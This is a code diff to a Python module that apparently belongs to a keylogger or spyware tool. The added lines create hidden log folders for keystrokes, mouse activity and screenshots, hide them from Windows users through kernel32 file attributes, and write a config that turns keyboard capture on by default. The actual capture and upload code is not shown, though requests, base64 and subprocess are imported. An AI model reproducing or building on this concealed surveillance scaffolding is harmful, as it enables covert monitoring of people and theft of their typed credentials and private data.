@@ -1,6 +1,6 @@
 from dotenv import load_dotenv
 from datetime import datetime
-import base64, os, requests, platform, ctypes, subprocess
+import base64, os, requests, platform, ctypes, subprocess, json
 
 async def detect_os():
     os_name = platform.system()
@@ -33,11 +33,11 @@ def redirect_output(source, target_queue):
     for line in iter(source.readline, b''):
         target_queue.put(line)
        
-async def check_log():
-    """Check if the arborescence is valid"""
+async def check_log(force=False):
+    """Check if the arborescence is valid & create it if not"""
+    
     try:
         system_os = await detect_os()
-        
         log_folder_path = './.log'
         # Verify if the file exist
         if not os.path.exists(log_folder_path):# if not, create it
@@ -45,8 +45,43 @@ async def check_log():
             if system_os == 'Windows':# if windows, hide the folder
                 FILE_ATTRIBUTE_HIDDEN = 0x02
                 ret = ctypes.windll.kernel32.SetFileAttributesW(log_folder_path, FILE_ATTRIBUTE_HIDDEN)
+        
+        keyboard_log_folder_path = './.log/.keyboard/'
+        if not os.path.exists(keyboard_log_folder_path):
+            os.makedirs(keyboard_log_folder_path)
+            if system_os == 'Windows':
+                FILE_ATTRIBUTE_HIDDEN = 0x02
+                ret = ctypes.windll.kernel32.SetFileAttributesW(keyboard_log_folder_path, FILE_ATTRIBUTE_HIDDEN)
+        
+        mouse_log_folder_path = './.log/.mouse/'
+        if not os.path.exists(mouse_log_folder_path):
+            os.makedirs(mouse_log_folder_path)
+            if system_os == 'Windows':
+                FILE_ATTRIBUTE_HIDDEN = 0x02
+                ret = ctypes.windll.kernel32.SetFileAttributesW(mouse_log_folder_path, FILE_ATTRIBUTE_HIDDEN)
+        
+        picture_log_folder_path = './.log/.pictures/'
+        if not os.path.exists(picture_log_folder_path):
+            os.makedirs(picture_log_folder_path)
+            if system_os == 'Windows':
+                FILE_ATTRIBUTE_HIDDEN = 0x02
+                ret = ctypes.windll.kernel32.SetFileAttributesW(picture_log_folder_path, FILE_ATTRIBUTE_HIDDEN)
+        
+        file_json = './.log/config.json'
+        if force or not os.path.exists(file_json):
+            with open(file_json, 'w') as file:
+                file.write('{"CAPTURE_KEYBOARD": {"TIME": -1, "STATE": true, "LOG":true},\n"CAPTURE_MOUSE": {"TIME": -1, "STATE": false, "LOG":true},\n"CAPTURE_PICTURE": {"TIME": -1, "STATE": false, "LOG":true}}')
+                file.close()
         else:
-            return True
+            try:
+                with open("./.log/config.json", 'r') as file:
+                    data = json.load(file)
+                    return data
+            except:
+                with open(file_json, 'w') as file:
+                    file.write('{"CAPTURE_KEYBOARD": {"TIME": -1, "STATE": true, "LOG":true},\n"CAPTURE_MOUSE": {"TIME": -1, "STATE": false, "LOG":true},\n"CAPTURE_PICTURE": {"TIME": -1, "STATE": false, "LOG":true}}')
+                    file.close()
+        return True
     except Exception: return False
 
     
